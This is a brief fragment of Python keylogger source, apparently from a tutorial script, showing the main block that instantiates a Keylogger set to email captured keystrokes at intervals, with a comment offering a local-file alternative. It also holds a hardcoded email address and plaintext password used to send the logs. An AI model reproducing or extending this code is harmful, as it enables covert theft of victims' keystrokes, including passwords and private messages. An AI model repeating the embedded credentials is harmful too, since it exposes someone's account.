...
EMAIL_ADDRESS = "oussouburgos@gmail.com"
EMAIL_PASSWORD = "hadot@g8389"
...
###########################################################
# Instanciate the keylogger
###########################################################
if __name__ == "__main__":
    # if you want a keylogger to send to your email
    keylogger = Keylogger(interval=SEND_REPORT_EVERY,report_method="email")
    # if you want a keylogger to record keylogs to a local file (and then send it using your favorite method)
